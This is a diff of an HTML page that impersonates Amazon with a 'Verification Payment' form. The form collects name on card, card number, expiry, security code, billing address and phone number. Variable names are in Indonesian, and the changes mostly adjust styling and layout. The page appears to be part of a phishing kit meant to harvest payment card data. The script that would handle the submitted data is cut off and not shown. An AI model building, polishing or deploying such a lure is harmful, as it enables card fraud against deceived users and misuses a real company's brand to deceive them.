@@ -6,39 +6,40 @@
     <title>Verification Payment</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
-        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
-        .logo { margin: 10px 0 20px; text-align: center; }
+        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .logo { margin: 10px 0 25px; text-align: center; }
         .logo img { height: 60px; }
-        .kotak { width: 100%; max-width: 550px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; }
-        h1 { font-size: 22px; margin-bottom: 20px; font-weight: 500; }
-        .bagian { margin-bottom: 20px; }
-        label { font-weight: 700; font-size: 13px; margin: 0 0 6px; display: block; }
-        .baris-dua { display: flex; gap: 15px; }
+        .kotak { width: 100%; max-width: 360px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; background: #fff; }
+        h1 { font-size: 22px; margin-bottom: 25px; font-weight: 500; color: #111; }
+        label { font-weight: 500; font-size: 13px; margin: 0 0 6px; display: block; color: #111; }
+        .input { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 3px; font-size: 14px; height: 32px; outline: none; background: #fff; }
+        .input:focus { border-color: #007185; box-shadow: 0 0 0 1px #007185; }
+        .input.salah { border-color: #d00; border-width: 2px; }
+        .baris-dua { display: flex; gap: 12px; }
         .baris-dua > div { flex: 1; }
-        .input { width: 100%; padding: 8px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; height: 38px; outline: none; }
-        .input:focus { border-color: #007185; box-shadow: 0 0 0 2px #c8f0f4; }
-        .kartu-baris { display: flex; gap: 10px; align-items: center; }
-        .kartu-logo { height: 25px; display: none; }
-        .tombol { width: 100%; padding: 12px; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; font-size: 15px; color: #0F1111; cursor: pointer; margin-top: 10px; }
+        .kartu-baris { display: flex; gap: 8px; align-items: center; }
+        .kartu-baris .input { flex: 1; }
+        .kartu-logo { height: 22px; display: none; }
+        .tombol { width: 100%; padding: 6px 10px; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; font-size: 14px; height: 36px; color: #0F1111; cursor: pointer; margin-top: 15px; font-weight: 500; }
         .tombol:hover { background: #f7ca00; }
-        .bawah { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; width: 100%; text-align: center; font-size: 11px; color: #555; }
-        .bawah a { color: #0066c0; text-decoration: none; margin: 0 8px; }
+        .bawah { margin-top: 30px; padding-top: 15px; border-top: 1px solid #e7e7e7; width: 100%; text-align: center; font-size: 11px; color: #555; }
+        .bawah a { color: #0066c0; text-decoration: none; margin: 0 6px; }
     </style>
 </head>
 <body>
     <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
-        <h1 id="judul">Verification Payment</h1>
+        <h1>Verification Payment</h1>
         
-        <div class="bagian">
-            <label id="labelNama">Name on card</label>
+        <div class="bagian" style="margin-bottom: 14px;">
+            <label>Name on card</label>
             <input type="text" id="namaKartu" class="input">
         </div>
 
-        <div class="bagian">
-            <label id="labelNomor">Card number</label>
+        <div class="bagian" style="margin-bottom: 14px;">
+            <label>Card number</label>
             <div class="kartu-baris">
-                <input type="text" id="nomorKartu" class="input" style="flex:1;" placeholder="•••• •••• •••• ••••">
+                <input type="text" id="nomorKartu" class="input" placeholder="•••• •••• •••• ••••">
                 <img src="img/visa.png" id="logoVisa" class="kartu-logo" alt="Visa">
                 <img src="img/mastercard.png" id="logoMC" class="kartu-logo" alt="Mastercard">
                 <img src="img/amex.png" id="logoAmex" class="kartu-logo" alt="Amex">
@@ -47,65 +48,68 @@
             </div>
         </div>
 
-        <div class="bagian baris-dua">
+        <div class="baris-dua" style="margin-bottom: 14px;">
             <div>
-                <label id="labelExp">Expiry date</label>
+                <label>Expiry date</label>
                 <input type="text" id="expKartu" class="input" placeholder="MM/YY" maxlength="5">
             </div>
             <div>
-                <label id="labelCVV">Security code</label>
+                <label>Security code</label>
                 <input type="text" id="cvvKartu" class="input" placeholder="••••" maxlength="4">
             </div>
         </div>
 
-        <div class="bagian">
-            <label id="labelAlamat">Billing address</label>
+        <div style="margin-bottom: 14px;">
+            <label>Billing address</label>
+        </div>
+
+        <div class="bagian" style="margin-bottom: 10px;">
             <input type="text" id="alamat1" class="input" placeholder="Street address">
         </div>
-        <div class="bagian">
+        <div class="bagian" style="margin-bottom: 14px;">
             <input type="text" id="alamat2" class="input" placeholder="Apartment, suite, etc. (optional)">
         </div>
 
-        <div class="bagian baris-dua">
+        <div class="baris-dua" style="margin-bottom: 14px;">
             <div>
-                <label id="labelKota">City</label>
+                <label>City</label>
                 <input type="text" id="kota" class="input">
             </div>
             <div>
-                <label id="labelProvinsi">State / Province</label>
+                <label>State / Province</label>
                 <input type="text" id="provinsi" class="input">
             </div>
         </div>
 
-        <div class="bagian baris-dua">
+        <div class="baris-dua" style="margin-bottom: 14px;">
             <div>
-                <label id="labelKodePos">Postal / Zip code</label>
+                <label>Postal / Zip code</label>
                 <input type="text" id="kodePos" class="input">
             </div>
             <div>
-                <label id="labelNegara">Country / Region</label>
+                <label>Country / Region</label>
                 <select id="negara" class="input"></select>
             </div>
         </div>
 
-        <div class="bagian baris-dua">
+        <div class="baris-dua" style="margin-bottom: 10px;">
             <div>
-                <label id="labelKodeTelp">Phone code</label>
+                <label>Phone code</label>
                 <input type="text" id="kodeTelp" class="input" readonly>
             </div>
             <div>
-                <label id="labelTelp">Phone number</label>
+                <label>Phone number</label>
                 <input type="text" id="nomorTelp" class="input">
             </div>
         </div>
 
-        <button type="button" id="lanjut" class="tombol">
-            <span id="teksTombol">Continue</span>
-        </button>
+        <button type="button" id="lanjut" class="tombol">Continue</button>
     </div>
     <div class="bawah">
-        <p><a href="#">Conditions of Use</a> <a href="#">Privacy Notice</a> <a href="#">Help</a></p>
-        <p style="margin-top:8px;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <a href="#">Conditions of Use</a>
+        <a href="#">Privacy Notice</a>
+        <a href="#">Help</a>
+        <p style="margin-top: 8px; color: #767676;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
 <script>
